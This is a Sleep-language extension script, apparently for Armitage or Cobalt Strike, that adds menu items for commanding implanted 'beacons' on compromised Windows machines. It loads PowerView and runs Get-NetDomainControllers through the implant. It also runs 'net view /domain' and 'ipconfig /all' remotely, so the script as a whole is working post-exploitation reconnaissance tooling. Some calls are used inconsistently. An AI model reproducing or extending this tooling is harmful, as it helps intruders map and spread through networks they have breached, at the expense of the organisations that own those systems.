import msf.*;
import java.awt.*;
import java.io.*;
import java.net.*;
import javax.swing.*;
import javax.imageio.*;
import ui.*;
import console.*;
import armitage.*;
import beacon.*;
import beacon.jobs.*;
import javax.swing.table.*;
import table.*;
import cloudstrike.*;

# task beacon to do our bidding...
sub taskit {
  call_async($mclient, "beacon.task", $1, $2, lhost());
  call_async($mclient, "beacon.task", $1, $3, lhost());
  call_async($mclient, "beacon.log_write", $1, "[*] $4 $+ \n");
}

sub _extractFunctions {
  local('$line @r');
  foreach $line (split("\n", $1)) {
    $line = ["$line" trim];
    if ($line ismatch '\s*function ([a-zA-Z0-9-]*).*?') {
      push(@r, matched()[0]);
    }
  }

  return @r;
}

sub task_powershell_import {
    # task ID ($1) with powershell command + args ($2)
    local('$id $len');

    $id = $1;
    $data = $2;
    $len = strlen($data);

    # task beacon to import the PowerShell script
    call_async("beacon.task", $id, pack("IIZ $+ $len", 0x25, $len, $data), lhost());
    call_async("beacon.log_write", $id, "[*] Tasked beacon to import PowerShell\n");
}

# task our beacon to execute a given powershell command
sub task_powershell {

    $id = $1;
    $len  = strlen($2);

    call_async("beacon.task", $id, pack("IIZ $+ $len", 0x24, $len, $2), lhost());
    call_async("beacon.log_write", $id, "[*] Tasked beacon to run: $2 $+ \n");
}


sub task_get_dom {
   $beacon_id = $1;
   $script_source = script_resource("powerview.ps1");

   # get all of our data that we're going to upload
   $handle = openf($script_source);
   $data = readb($handle, -1);
   closef($handle);

   # task the beacon to import the powershell data
   task_powershell_import($beacon_id, $data);

   # actually task the beacon
   task_powershell($beacon_id, "Get-NetDomainControllers -Verbose");
###
}

popup beacon_top {
   item "Get Domain" {
     local('$bid');
     foreach $bid ($1) {
        task_get_dom($bid);
     }
   }

   item "Get Domain (cmd)" {
     local('$bid');
     foreach $bid ($1) {
        bshell($bid, "net view /domain");
     }
   }

  item "ipconfig" {
     local('$bid');
     foreach $bid ($1) {
        bshell($bid, "ipconfig /all");
     }
   }
}